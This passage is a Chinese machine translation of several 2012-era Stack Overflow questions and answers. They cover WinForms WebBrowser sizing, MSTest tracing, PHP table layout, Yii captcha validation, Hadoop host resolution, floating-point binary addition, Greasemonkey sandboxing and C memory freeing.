我缺乏的两件事。第一个是一个大错误，它是一个优先事项，因为它必须得到修复。起初，蓝色的“W”和它的阴影被剪掉了，在你最初运行它并翻转后，绿色的“W”和它的阴影被剪掉，当推出时，蓝色的“W”被剪掉。不确定解决方案是否css 或 js，但我似乎找不到正确的解决方案。

第二个真的是两个小化妆品。第一件小事 - 当字母进来时，你可以看到闪烁，而我假设 css/js 被应用。如果可能的话，有什么方法可以最大限度地减少闪烁或消除？第二件小事-当脚本第一次运行时，字母一个接一个地突然出现。有没有办法让一个很好的淡入淡入来处理每个字母？- 我找不到合适的地方来应用它。

这是 jsFiddle：http: [//jsfiddle.net/billparti/8XFSx/](http://jsfiddle.net/billparti/8XFSx/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:18:11.303

我不确定这是不是问题，但 jquery 的动画确实将溢出隐藏到元素中。这有点痛苦，您可以通过添加一个`!important`css 属性来解决这个问题。这很烦人...

# c# - WebBrowser 控件：如何最大化它

> ID：12146419
> 
> 赞同：0
> 
> 时间：2012-08-27T17:13:05.327
> 
> 标签：c#, .net

我在一些 DLL 中使用 WebBrowser 来制作屏幕截图。

主要问题是它有时没有最大化，我猜它需要 Internet Explorer 的设置。

所以我的问题是如何通过 C# 最大化 WebBrowser 控制？

谢谢！

```
 Rectangle r = new Rectangle();

            r.X = cropToRectangle.X;
            r.Y = cropToRectangle.Y;
            r.Width = cropToRectangle.Width;
            r.Height = cropToRectangle.Height;

            Point p = new Point();
            p.X = scrollTo.X;
            p.Y = scrollTo.Y;

            var sb = Math.Max(SystemInformation.VerticalScrollBarWidth, SystemInformation.HorizontalScrollBarHeight);

            var size = new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);

            using (var form =
                new FocuslessForm
                {
                    Width = size.Width + sb,
                    Height = size.Height + sb,
                    Padding = new Padding(0),
                    Margin = new Padding(0),
                    FormBorderStyle = FormBorderStyle.None,
                    Opacity = 0,
                    TabStop = false,
                    ShowInTaskbar = false
                })
            {
                var webBrowser1 = new WebBrowser
                    {

                        Padding = new Padding(0),
                        Margin = new Padding(0),
                        Dock = DockStyle.Fill,
                        Url = url,
                        TabStop = false
                    };
                form.Controls.Add(webBrowser1);

                var finished = false;

                webBrowser1.DocumentCompleted += delegate 
                {
                    webBrowser1.Document.Window.ScrollTo(p); 
                    finished = true; 
                };

                form.Show();

                while (!finished)
                {
                    Application.DoEvents();
                }

                image = CaptureBrowserScreenshot(webBrowser1, r);
                form.Close();
            } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:17:48.537

嗯，WebBrowser 是嵌入到您自己的程序窗口中的控件；它不会将 IE 作为单独的进程启动（尽管它会为渲染器和其他关键代码连接到 IE）。因此，控件的位置和大小取决于您嵌入它的位置。

我看到您正在将控件填充到表单中。这是一个很好的第一步。现在，您必须确保将 WebBrowser 控件添加到窗体的控件层次结构中（因此它会显示出来），然后您必须最大化该窗体。这样做的方法是将 Form 的 WindowState 属性设置为 WindowState.Maximized。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-18T07:06:51.437

我实现了表单`resize`事件，当表单最大化时，我将网络浏览器大小设置为表单大小。

它在我的应用程序中运行良好，我为谁担心。

```
private void Form1_Resize(object sender, EventArgs e)
{
    webBrowser1.Size = this.Size;
} 
```

# visual-studio-2010 - 从命令行运行 mstest.exe 时没有调试跟踪

> ID：12146421
> 
> 赞同：4
> 
> 时间：2012-08-27T17:13:29.883
> 
> 标签：visual-studio-2010, command-line, mstest, trace

我有一组 mstest 单元测试，用于`Trace.Write`收集一些调试信息。当我从 VS2010 运行它然后转到测试运行详细信息时，有调试跟踪部分，我可以在其中看到我的所有消息。

但是当我在构建机器上从命令行运行相同的测试时，没有记录跟踪。

我尝试过的事情：

*   确保我处于调试配置中
*   */details带有**debugtrace*、*traceinfo*等选项的命令行开关
*   我知道通过侦听器将跟踪保存到磁盘上的文件中，但我想找到一个解决方案来编写

有人遇到过类似的问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:17:47.753

尝试`Console.WriteLine`改用。我之前遇到过这个问题`MSTest`，并且使用了`WriteLine`为我工作的 - 因为在测试结果视图中有可用的输出。

不知道其他东西喜欢`Debug.WriteLine`或`Trace.WriteLine`不起作用，老实说，我从来没有费心去发现。（好吧，我停止使用`MSTest`并移至`NUnit`）

# jpa - javax.persistence.PersistenceException

> ID：12146422
> 
> 赞同：1
> 
> 时间：2012-08-27T17:13:32.663
> 
> 标签：jpa, junit

我有一个与 EE 项目连接的 JPA 项目有问题，我已经为源包中的 DAO 完成了测试（JUnit 4），其中只有这个测试单元的 persistence.xml。当我要测试它们时，它们会收到这个错误，就像单元测试找不到持久性提供程序一样。请有人帮助我。谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:38:28.470

找不到持久性提供程序是指 JPA 提供程序 Jar 文件未包含在您的测试环境中。确保 JPA 提供程序（Hibernate/OpenJPA 或您的应用程序服务器提供的任何东西）jar 在您的测试用例读取依赖库的类路径中可用。

# php - 使用一个php查询迭代一个两行三列的html表

> ID：12146424
> 
> 赞同：0
> 
> 时间：2012-08-27T17:13:34.417
> 
> 标签：php, html, arrays, while-loop

我有一个数据库表，该表有 6 行。我想要的是使用 3 列和 2 行表在 html 页面中显示 6 行。

我知道如何使用 php 数组和 while 循环。我的问题是如何限制数组将 3 个项目放在第一行，将另外 3 个项目放在下一行。

这是我尝试过但没有用的

```
<div id="maincontent">
  <!-- class one -->
      <?php 
        $getSection = getSection();
        $i=0;
        while($allSection = mysql_fetch_array($getSection)){
      ?>
      <div class="subconent">
<table width="937" border="0">
  <tr>
    <td>
        <div class="sub_image">
            <a href="section.php?id=<?php echo urlencode($allSection['id']); ?>"><img src="admin/uploads/fron_sect/<?php echo $allSection['image']; ?>" width="134" height="120" border="0" alt="HNA" class="PopBoxImageLink"  onmouseover="PopEx(this,-50,-25,205,186,20,null);" onclick="window.location='http://localhost/hants/section.php?id=<?php echo urlencode($allSection['id']); ?>'" /></a>
        </div>
            <div class="cont_txt">
              <h3><?php echo $allSection['name_full']; ?></h3>
                <p><?php echo substr($allSection['description'],0,140) . ""; ?></p>
                <br />
              <a href="section.php?id=<?php echo urlencode($allSection['id']); $i++; ?>"><img src="images/read_more.jpg" alt="Read More" width="89" height="25" border="0" /></a>
            </div>
    </td>
  </tr>
</table>
</div>
<?php 
if($i==4) { ?>
<table width="937" border="0">
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td></tr>
<tr><div class="sub_image">
            <a href="section.php?id=<?php echo urlencode($allSection['id']); ?>"><img src="admin/uploads/fron_sect/<?php echo $allSection['image']; ?>" width="134" height="120" border="0" alt="HNA" class="PopBoxImageLink"  onmouseover="PopEx(this,-50,-25,205,186,20,null);" onclick="window.location='http://localhost/hants/section.php?id=<?php echo urlencode($allSection['id']); ?>'" /></a>
        </div>
            <div class="cont_txt">
              <h3><?php echo $allSection['name_full']; ?></h3>
                <p><?php echo substr($allSection['description'],0,140) . ""; ?></p>
                <br />
              <a href="section.php?id=<?php echo urlencode($allSection['id']); ?>"><img src="images/read_more.jpg" alt="Read More" width="89" height="25" border="0" /></a>
            </div><td>
<?php   }
} ?>
  </div> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-27T17:20:16.303

使用模运算符 (%)：

[http://www.devchunks.com/web-development/using-the-php-modulus-operator/](http://www.devchunks.com/web-development/using-the-php-modulus-operator/)

像这样的东西：

```
<table>

<?php

$i = 0;
while ( $row = mysql_fetch_array($result) ){
    if ($i % 3 == 0){
        echo '<tr>';
    }
    echo '<td>'.$row['column_name'].'</td>';
    if ($i % 3 == 2){
        echo '</tr>';
    }
    $i++; 
}

//here is a check in case you don't have multiple of 3 rows
if ($i % 3 != 0){
    echo '</tr>';
}

?>

</table> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:22:37.490

在它的基础上，你需要这样的东西：

```
<table>
<tr>

<?

$count = 0;
foreach ($row) {
    echo "<td>" . $row["value"] ."</td>";
    $count++;

    if (($count % 3) == 0) && ($count > 0) {
        echo ("</tr><tr>");
    }
}

?>

</tr>
</table> 
```

开始打印表格的标题，然后开始遍历数据集。跟踪您打印了多少，如果这是第三个，则打印 HTML 以完成这一行并开始下一行。（我用过`%`，所以它会在第三个条目上换行，而不仅仅是第一个）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:18:34.510

好吧，您可以在您的 sql 查询中正确获取这些信息（只是一个适合[http://en.wikibooks.org/wiki/MySQL/Pivot_table](http://en.wikibooks.org/wiki/MySQL/Pivot_table)的示例）。

或者干脆将所有内容提取到 PHP 数组中。

老派：mysql_query() 和 while($row = mysql_fetch_array()) 新派：PDO ( [http://de.php.net/manual/en/book.pdo.php](http://de.php.net/manual/en/book.pdo.php) )

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T08:00:46.463

惊人的！非常感谢。它对我有用，Zend。你可以尝试这样的事情。

```
 <table width="1024px" border="0" cellspacing="2" cellpadding="2">  
  <?php
      $i = 0;
      foreach ($this->rows as $row )
      {
          $img = IMAGE_PATH . '/' . 'gallery/' . $row->gly_thumbnail;
          if ($i % 3 == 0)
          {
              echo '<tr>';
          }
  ?>
  <td align="center">
    <img src="<?php echo $img; ?>" width="300" height="215"><br/>
    <?php echo $row->gly_title; ?>
  </td>
  <?php        
          if ($i % 3 == 2)
          {
              echo '</tr>';
          }
          $i++; 
      }

      //here is a check in case you don't have multiple of 3 rows
      if ($i % 3 != 0)
      {
          echo '</tr>';
      }

  ?>
</table> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-06-24T07:13:55.503

```
 <?php if ($i++%$_columnCount==0): ?>
                        <tr>
                    <?php endif ?>

                    <td> <img src="<?php echo site_url('uploads/shelter_images/'.$row->shelter_id."/".$img->imagefile) ?>" alt="" width="300" ></td>

                     <?php if ($i%$_columnCount==0 || $i==$totalImg): ?>
                      </tr>
                   <?php endif; ?> 

            <?php  } ?> 
```

# c# - 从经典 ASP 中检索包含的正则表达式

> ID：12146433
> 
> 赞同：0
> 
> 时间：2012-08-27T17:14:27.773
> 
> 标签：c#, regex, c#-4.0, asp-classic

我有一个项目来搜索 1400 多个经典的 asp 网站，以搜索我们传递用户名和密码的所有地方。在这样做时，我需要检索所有包含，因为大部分逻辑都在包含中。我已经构建了一个代码爬虫，但是很难想出一个看似简单的正则表达式来返回给定文件中的所有包含。

模式是这样的：

```
 <!--#include file="includes/headers.inc"--> 
```

有人可以帮我解决这个问题。我需要与此模式匹配的东西并返回

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:17:01.647

```
var includes = new List<string>();
var regex = new Regex("#include\\W+file=\"([^\"]+)\"");
var matchResult = regex.Match(fileContent);
while (matchResult.Success) {
    includes.Add(matchResult.Groups[1].Value);
    matchResult = matchResult.NextMatch();
} 
```

# php - Yii 验证码客户端验证如何工作？

> ID：12146436
> 
> 赞同：0
> 
> 时间：2012-08-27T17:14:50.557
> 
> 标签：php, yii

我已禁用 ajax 验证，但我有`'enableClientValidation'=>true` 形式。会话保存在数据库中。那么 Yii 如何检查 Captcha 字段以关注另一个字段？我看不到 net-> all firebug 选项卡有任何变化。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T06:04:52.313

如果不调用`[$form->error()](http://www.yiiframework.com/doc/api/1.1/CActiveForm#error-detail)`.

如果要使用 ajax 验证或客户端验证，请务必调用..

```
$form->error($model, 'field') 
```

..在需要实时验证的每个字段的视图文件中。

我希望它能解决你的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-19T21:29:25.510

我们大多认为客户端的验证码验证是不可能的，但它是可能的。

是的，yii 可以使用简单的哈希（一侧加密）公式在客户端进行验证码。由于这个原因，没有 ajax 请求，“我们看不到 net->all firebug 选项卡有任何变化。”（Shayan 说）

有时我们可能会认为使用 javascript 之类的开源代码不可能生成单侧哈希，但如果您根据自身加密一个句子或一个单词，这是可能的。所以要么不存在源密钥和解密密钥（类似于 php 的 crypt 函数）。php md5 函数会自动执行此操作。

```
var hash = jQuery('body').data('captcha.hash'); //hash in the jQuery data storage of body
if (hash == null)
    hash = 563;//this simple hash is generated by server and will be different for different captcha images
else
    hash = hash[1];
for(var i=value.length-1, h=0; i >= 0; --i) h+=value.toLowerCase().charCodeAt(i);
if(h != hash) {
    messages.push("The verification code is incorrect.");
} 
```

因此，使用客户端验证器，验证码将在客户端和服务器中验证两次。

另一个注意事项：yii doc 的正确句子是：

> 基于 AJAX 的验证有一些限制。首先，它不适用于文件上传字段。其次，它不应该用于执行可能导致服务器端状态更改的验证。第三，它目前不适合使用表格数据输入。

yii 句子中的第二个注释意味着当您使用 ajax 验证时，服务器端 ajax 验证会导致服务器端会话存储库中的验证码图像代码被刷新（我几天前遇到的问题），因为在 ajax 验证过程中整个表单将被提交到服务器以仅验证一个字段。Yii 为 CCaptchaAction 提供了一个默认值为 3 的 testTime 属性，以便在之前的验证码验证成功时重用验证码。但这没有用，因为如果您的验证码字段在注册表单检查用户名时为空，则验证码验证将失败（不成功）。然而，对于我们来说，在 CCaptchaValidator 的 ajax 验证中排除验证码验证就像小菜一碟一样简单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-28T01:21:19.683

客户端验证将 JavaScript 代码放置在验证数据的页面底部，而不是使用 Ajax。由于没有在客户端存储答案的情况下无法使用 JavaScript 来验证验证码，除非您使用 Ajax，否则这是不可能的。但是 Yii 提供的内置验证码仅在表单提交时进行验证，即使启用了 Ajax 验证也是如此。

[http://www.yiiframework.com/doc/api/1.1/CActiveForm](http://www.yiiframework.com/doc/api/1.1/CActiveForm)它声明...

> CActiveForm 在支持 AJAX 验证方面存在一些限制。首先，它不使用文件上传字段进行验证。其次，它不应该用于执行可能导致服务器端状态更改的验证。例如，它不适合执行由 CCaptchAction 完成的 CAPTCHA 验证，因为每个验证请求都会将测试数量增加一。第三，它目前不适合使用表格数据输入。

因此，如果您想在客户端验证验证码，您必须使用 Ajax，并且您必须自己编程，因为默认情况下 Yii 不提供此功能。

# exception - 格式化 HDFS 时出现 UnknownHostException

> ID：12146439
> 
> 赞同：4
> 
> 时间：2012-08-27T17:15:14.583
> 
> 标签：exception, hadoop, hdfs

[我已经使用以下说明](https://ccp.cloudera.com/display/CDH4DOC/Installing+CDH4+on+a+Single+Linux+Node+in+Pseudo-distributed+Mode#InstallingCDH4onaSingleLinuxNodeinPseudo-distributedMode-InstallingCDH4withMRv1onaSingleLinuxNodeinPseudodistributedmode)在 CentOS 6.3 64 位上以伪分布式模式安装了 CDH4 。Hadoop 配置文件中的所有内容都设置为 localhost。但是，当我格式化名称节点时，仍然会出现以下异常。当我向文件添加`192.168.1.101 CentOSHost`条目时，`/etc/hosts`异常消失了，我可以运行格式化/启动 HDFS 并运行 MR 作业。

即使在没有向文件添加条目的情况下未连接到网络时，我也想运行 MR 作业`/etc/hosts`。如何完成这项工作？

> 12/08/27 22:17:15 WARN net.DNS：无法确定主机的地址 - 回退到“localhost”地址 java.net.UnknownHostException：CentOSHost：CentOSHost
> 在 java.net.InetAddress.getLocalHost(InetAddress. java:1360)
> 在 org.apache.hadoop.net.DNS.resolveLocalHostIPAddress(DNS.java:283)
> 在 org.apache.hadoop.net.DNS.(DNS.java:59) 在 org.apache.hadoop.hdfs。 server.namenode.NNStorage.newBlockPoolID(NNStorage.java:1017)
> 在 org.apache.hadoop.hdfs.server.namenode.NNStorage.newNamespaceInfo(NNStorage.java:565)
> 在 org.apache.hadoop.hdfs.server.namenode。
> org.apache.hadoop.hdfs.server.namenode.NameNode.format(NameNode.java:724) 上的FSImage.format(FSImage.java:145 )
> 在 org.apache.hadoop.hdfs.server.namenode.NameNode.createNameNode(NameNode.java:1095)
> 在 org.apache.hadoop.hdfs.server.namenode.NameNode.main(NameNode.java:1193)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T18:06:29.337

看起来有些配置正在返回/使用主机名作为`CentOSHost`.

什么`hostname --fqdn`回报给你？

对于 Hadoop，名称查找和反向查找的成功非常重要。您应该能够解析 ip-address 并从 ip-address 解析主机名（反向解析）。这可以使用上面的命令进行测试。

需要进入 /etc/hosts 才能使反向解析起作用。除非条目和配置指向本地主机。即使在这种情况下，`hostname --fqdn`也应该返回为`localhost`.

# floating-point - 浮点加法说明

> ID：12146443
> 
> 赞同：0
> 
> 时间：2012-08-27T17:15:42.257
> 
> 标签：floating-point

我正在学习浮点加法，但我很困惑。我正在使用的示例是这样的：

（假设 8 位机器，指数超 3）

```
x = 6.75 = 01011011
y = -10 = 11100100 
```

非规范化并使用相同的指数给出：

```
x = 1.1011 x 2^2 = 0.1101 x 2^3
y = -1.0100 x 2^3 
```

加/减尾数给出：

```
01101 + -10100 = -00111 
```

我不太明白 01101 + -10100 = -00111。有人可以向我解释一下吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:36:16.113

首先，缩放 1.1011•2 ²应该给出 0.11011•2 ³，而不是 0.1101•2 ³。提前丢弃比特是错误的。

然而，考虑到它的方式，我们想要计算 01101 + -10100。将较大的数字放在较小的数字之上，并记住，因为较大的数字是负数，所以结果必须是负数：

```
1 0 1 0 0
0 1 1 0 1
_________ 
```

现在减去小学的方式。在右边，我们从 0 中减去 1。这需要从左边的数字借位，所以我们从 10 中减去 1（0 加上借来的值）并标记借位：

```
1 0 1 0'0
0 1 1 0 1
_________
        1 
```

现在我们从 -1 中减去 0（0 减去借位）。这需要再次借用，所以我们从 1 中减去 0（0 减去 1 的借用加上 10 的新借用）：

```
1 0 1'0'0
0 1 1 0 1
_________
      1 1 
```

然后是 0 中的 1（1 减去借来的 1）。我们再次借用，所以我们从 10 中减去 1：

```
1 0'1'0'0
0 1 1 0 1
_________
    1 1 1 
```

然后从 -1 得到 1（0 减去借来的 1）。我们再次借，所以我们从 1 中减去 1（0 减去借来的 1 加上新借来的 10）：

```
1'0'1'0'0
0 1 1 0 1
_________
  0 1 1 1 
```

然后 0 从 0（1 减去借来的 1）。最后，没有新的借用，我们有：

```
1'0'1'0'0
0 1 1 0 1
_________
0 0 1 1 1 
```

我们记得这是负数，所以结果是 -00111。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:35:53.167

解释它的最简单方法是将它们转换为十进制。

```
+01101 (base 2) = +13 (base 10)
-10100 (base 2) = -20 (base 10)

-20 + 13 = -7

-7 (base 10) = -00111 (base 2) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:36:08.357

首先，当我被困在非十进制基础上做简单的数学运算时，我发现将其转换回十进制以查看发生了什么有时会很有用。

所以，首先，添加数字给了我们

```
6.75 - 10.0 = -3.25 
```

或者在二进制中，不要太担心指数，因为它们是相同的幂

```
01101 - 10100 = -00111 
```

手动执行此操作的最佳方法是查找结果

```
 10100
-01101 
```

使用正常的加法规则，然后反转结果。简要地：

从最左边借 1 以执行减法：

```
 02100
-01101
 _____
 00111 
```

并且由于最右下列的 1，我们需要再次借用，类似于十进制执行。

现在，让我们仔细检查一下这个结果到底是什么：

```
-0.0111_2 * 2 ^ 3 
```

实际上是-3.5！之所以如此，是因为将 1.1011 x 2^2 视为 0.1101 x 2^3 而不是其实际值 0.11011 x 2^3 会导致精度下降。

# xml - 在某些模拟器上的 Lwuit J2ME 应用程序中解析 Xml 失败

> ID：12146444
> 
> 赞同：0
> 
> 时间：2012-08-27T17:15:43.390
> 
> 标签：xml, parsing, java-me, sdk, lwuit

我有一个解析本地 XML 的 LWUIT j2me 应用程序。我在 (Java TM Platform Micro SDK 3.0 DefultFxPhone 1) 和 asha 模拟器 (Nokia_SDK_1_1_Java) 上尝试了我的代码。我还在不同的设备上测试了代码，它工作正常。但是，当我在（Nokia_SDK_2_0_Java 模拟器 Nokia Asha 305）上对其进行测试时，while 循环中的条件始终为假。我认为解析器有问题。有什么帮助吗？我怎样才能弄清楚为什么这个问题只发生在这个 SDK 的解析器中。我在 parseEvent event=Parser.read(); 上得到了这个异常；

```
java.io.IOException
at com.sun.cldc.io.ResourceInputStream.read(+104)
at java.io.Reader.read(Reader.java:99)
at java.io.InputStreamReader.read(+11)
at org.kxml.parser.XmlParser.peekChar(+36)
at org.kxml.parser.XmlParser.peek(+68)
at org.kxml.parser.XmlParser.read(+11) 
```

这是解析代码：

```
 Reader reader = new InputStreamReader(in, "UTF-8");

   XmlParser parser=new XmlParser(reader);
   Vector items = new Vector();
   String tipId;
   String Text;
   String tipImage;
   String cateId = null;
   String cateName;
   String objId = null;
   String objName;

   ParseEvent event = parser.read();
   ParseEvent readTextEvent = null;
   while (event.getType() != Xml.END_DOCUMENT) {
          switch (event.getType()) {
             case Xml.START_TAG:

                  if (event.getName().equalsIgnoreCase("Category")){
                    cateId=event.getAttribute("id").getValue();

                }

                if (event.getName().equalsIgnoreCase("object")){

                    objId=event.getAttribute("id").getValue();

                }

                if (event.getName().equalsIgnoreCase("Tip")){
                    if(CategoryId.equals(cateId) && objectId.equals(objId)) 
                    {

                     readTextEvent=parser.read();
                     bean=new bean();
                     isItem=true;

                    }

                }
                if (isItem &&event.getName().equalsIgnoreCase("text")){
                     readTextEvent=parser.read();
                     Text = readTextEvent.getText();
                     bean.setTipText(Text);

                }

                 if (isItem &&event.getName().equalsIgnoreCase("Image")){
                     readTextEvent=parser.read();
                     tipImage = readTextEvent.getText();

                     bean.setTipImage(tipImage);
                     isItem=false;
                     items.addElement(bean);

                }

               break;
               case Xml.END_TAG:
                 if (event.getName().equalsIgnoreCase("Tip")) {

                     bean = null;
                     isItem = false;
                   }
                 break;
                case Xml.TEXT:
                break;
             }
          event = null;
          event = parser.read();

          } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:36:15.823

`XmlParser`from LWUIT/ CodenameOne[没有](http://www.codenameone.com/)读取方法。您提供的堆栈似乎不完整，因为它缺少您对 read 方法的调用。

# javascript - Greasemonkey 1.0 中的 jQuery 与使用 jQuery 的网站冲突

> ID：12146445
> 
> 赞同：21
> 
> 时间：2012-08-27T17:15:45.310
> 
> 标签：javascript, jquery, firefox, greasemonkey, tampermonkey

自从几天前发布了新的 Greasemonkey 1.0 以来，每个具有 jQuery 的站点以及我在 Greasemonkey 脚本中使用 jQuery 的地方都无法正确运行我的脚本。我的 GS 脚本（使用`@require`元数据）中的 jQuery 与页面的 jQuery 冲突。这是由于新[`@grant`](http://wiki.greasespot.net/@grant)代码。

我已经阅读了文档，但仍然不知道如何在沙箱中再次运行 GS 脚本；唯一的选择似乎是要么授予对 GS API 的访问权限，要么将其授予 none 并在没有任何安全限制的情况下运行脚本，当我设计要运行的数十个 GS 脚本时，这对我来说根本不起作用有安全限制，喜欢这样。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-04T00:34:20.517

[Greasemonkey 1.0 从根本上改变了沙盒的工作方式](http://wiki.greasespot.net/@grant)，破坏了数千个脚本。这是一个巨大的问题，我希望你能和我一起就[这个问题的主要错误报告](https://github.com/greasemonkey/greasemonkey/issues/1614)发表你的意见/经验。

[Greasemonkey 博客声称您可以使用以下方法解决此问题](http://www.greasespot.net/2012/08/greasemonkey-10-jquery-broken-with.html)：

```
this.$ = this.jQuery = jQuery.noConflict(true); 
```

...我不确定这是否适用于所有情况。从避免副作用、[DRY 原则](http://c2.com/cgi/wiki?DontRepeatYourself)、原子编码的哲学来看，这是完全错误的方法。在我*看来*，最好的策略是恢复沙盒。

`@grant`通过指定一个值（不是`none`）来重新激活沙箱。编辑您的**[元数据块](http://wiki.greasespot.net/Metadata_Block)以以下行结尾**：

```
// @grant       GM_addStyle
// @grant       GM.getValue
// ==/UserScript==
/*- The @grant directive is needed to work around a design flaws introduced in GM 1.0
    and again in GM 4.0.
    It restores the sandbox.
*/ 
```

沙箱将被恢复，所有冲突都将得到解决。
这些脚本将与 Tampermonkey 和 Violentmonkey 等高级引擎兼容。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-05-28T14:44:15.950

两年过去了，这个“功能”仍然没有被充分记录或解决。

需要 jQuery 的脚本仍然与一些使用 jQuery 的页面发生冲突。

潜在的解决方案是：

1.  添加`@grant GM_log`或类似沙箱的脚本
2.  通过添加此块为脚本中现有的 jQuery 对象添加别名：

    `var my_jquery = jQuery;`

    `jQuery.noConflict(true);`

    `var $ = my_jquery, jQuery = my_jquery;`

3.  不要使用 jQuery

总而言之，Greasemonkey 做出了一个糟糕的决定。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-21T12:23:09.403

有同样的问题。

`@require`从 GM 版本 1.0 开始，我在使用 jQuery 的网站上运行的所有 jQuery 脚本都停止了工作。

我知道，我可以尝试类似的东西`$ = unsafeWindow.$`，但这不是重点。

这里的重点是他们曾经工作，现在他们不会了。

添加`@grant GM_log`修复它们。

# drupal - Drupal 6 Webform - 组件呈现在错误的位置

> ID：12146448
> 
> 赞同：0
> 
> 时间：2012-08-27T17:15:51.627
> 
> 标签：drupal, drupal-6

我正在向 Drupal 6 网络表单添加一个新组件。新的“选择选项”组件都呈现在同一区域，无论它们在后端的哪个位置。我刚刚将“感兴趣的区域”添加为列表框和网络表单的第一项。看看它在哪里结束：[删除]

该站点是由另一个开发团队建立的，所以我不确定他们对 Webform 做了什么。有谁知道他们能做什么？否则我将不得不从头开始重新创建网络表单。

我的设置屏幕图片：

![](../Images/4c1a6091ff40720f206e234078eba671.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T19:33:51.593

如果您查看您的网络表单正在输出的 html，它就会开始变得更有意义。

'city' 和 'area of​​ interest' 字段都是 'webform-component-city' div 的子项，因此它们并排显示。如果无法访问您的网络表单，很难弄清楚为什么会发生这种情况，但我希望它可以帮助您进一步解决问题。

![在此处输入图像描述](../Images/76745bb059afa5e7acd04e1a713373e6.png)

如果您的浏览器上没有安装 firebug 或其他 Web 开发工具来帮助您查看网站的 html，您仍然可以通过查看 Web 表单上的源来进行故障排除......

让我们知道您是否有任何其他问题或您是否想通了！

# android - 片段应用程序创建两个图标 - 一个用于主要活动，一个用于片段活动

> ID：12146450
> 
> 赞同：0
> 
> 时间：2012-08-27T17:16:05.327
> 
> 标签：android, android-fragments, android-activity

所以是的，我使用两个片段的片段应用程序在安装在设备上时会创建两个图标 - 一个用于主要活动，一个用于片段活动之一。他们俩都工作正常。

如何使我的应用程序仅由一个启动器图标表示？

是的，我知道这真是个无聊的问题。

提前谢谢xx

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:20:07.173

编辑您的清单文件，使其只有一个带有意图过滤器的活动，如下所示：

```
<intent-filter>
   <action android:name="android.intent.action.MAIN" />
   <category android:name="android.intent.category.LAUNCHER" />
</intent-filter> 
```

# html - 我需要更改在 Facebook 上发布网页时显示的缩略图

> ID：12146451
> 
> 赞同：-2
> 
> 时间：2012-08-27T17:16:06.033
> 
> 标签：html, facebook, web, thumbnails

我需要更改在 Facebook 上发布新网页时显示的缩略图及其相关信息。它似乎已保存在 facebook 的缓存中，但我找不到它。

我的网页是：www.bigotefilms.com

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-28T21:39:15.490

```
<link rel="image_src" href="http://www.domain.co.uk/images/image.jpg"> 
```

包括在你`<head>`的这是我用于我的网站的内容。

[您的问题与此](https://stackoverflow.com/a/6943607/1354137)重复

# c - 释放双指针

> ID：12146453
> 
> 赞同：0
> 
> 时间：2012-08-27T17:16:13.363
> 
> 标签：c, memory-management, malloc, free

```
int size_of_daten = 5;
char *data[size_of_daten];
char *normal_Pointer = (char*)malloc(sizeof(char) * 100);
int i;

for(i=0; i<size_of_daten; i++) {
    data[i] = (char*)malloc(sizeof(char) * 100);
}

data[0] = "0";
data[1] = "1";
data[2] = "2";
data[3] = "3";
data[4] = "4";

printf("data[2] %s\n",data[2]);

strcpy(normal_Pointer,data[2]);

for(i=0; i<size_of_daten; i++) {
   free(data[i]);
}

free(data); 
```

我刚试过这个......即使我在分配数组时释放了它......我也复制了它的值`data[2]`并且没有指向它......所以这不应该是问题......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:17:55.673

您正在尝试将 strings `"0"`、`"1"`等复制到您的`data`数组中：您不能只用于`=`复制字符串，您需要使用字符串库方法，例如[`strcpy`](http://en.cppreference.com/w/c/string/byte/strcpy).

一旦将这些文字字符串（例如：）分配给数组元素`data[0]= "0";` ，数组元素就不再指向您分配的内存，它们指向不属于您的内存，并且您不能使用`free`. 您丢失了对内存块的引用`malloc`，导致内存泄漏。

此外，您不能这样做，`free(data);`因为它不是使用分配`malloc`的：它是在堆栈上分配的数组。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:18:23.917

这不是您将数据复制到`char`先前分配的 s 数组中的方式：

```
data[0]= "0";
data[1]= "1";
data[2]= "2";
data[3]= "3";
data[4]= "4"; 
```

您正在用 5 个新指针的地址*覆盖*指针。此时，您已经丢失了分配的内存地址，当您调用时，`free`您是在静态分配的 string 上调用它`"0"`。

您需要使用[`strcpy`](http://en.cppreference.com/w/c/string/byte/strcpy)将字节从一个字符数组复制到另一个：

```
strcpy(dest[0], "0");
strcpy(dest[1], "1");
/* etc */ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:19:50.783

与`data[0]= "0"`您一起覆盖任何由`malloc`. 你应该做的是

```
strcpy(data[0], "0");
strcpy(data[1], "1");
... 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-27T17:21:40.203

